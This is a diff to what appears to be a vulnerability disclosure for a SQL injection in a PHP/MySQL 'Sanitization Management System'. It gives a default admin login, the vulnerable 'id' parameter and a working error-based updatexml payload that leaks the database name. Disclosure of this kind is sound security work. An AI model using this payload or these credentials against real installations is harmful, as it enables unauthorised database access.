@@ -6,15 +6,17 @@ Login account: admin/admin123 (SuperAdmin account)
 
 vendors: https://www.sourcecodester.com/php/15770/sanitization-management-system-project-php-and-mysql-free-source-code.html
 
-The program is built using the xmapp-php8.1 version
+The program is built using the xmapp-php 8.1 version
 
-Vulnerability File: /php-sms/admin/?page=services/view_service&id=
+Vulnerability File: /php-sms/admin/services/view_service.php
 
-Vulnerability location: /php-sms/admin/?page=services/view_service&id=, id
+Vulnerability location: /php-sms/admin/?page=services/view_service&id=
+
+Vulnerability Parameter: id
 
 dbname =sms_db,length=6
 
-[+] Payload: /php-sms/admin/?page=services/view_service&id=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ // Leak place ---> id
+[+] Payload: /php-sms/admin/?page=services/view_service&id=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ 
 
 
 exp:
@@ -30,5 +32,4 @@ Cookie: PHPSESSID=3puonr8mf2gr4m6iivf71mhjtq
 Connection: close
 ```
 
-
-![image](https://user-images.githubusercontent.com/54017627/195977623-b958f949-210a-494b-8e25-0823176e045d.png)
+![sqli](https://user-images.githubusercontent.com/66857673/198275712-19324a37-30d1-4aa4-ab8e-2f573ed90138.png)
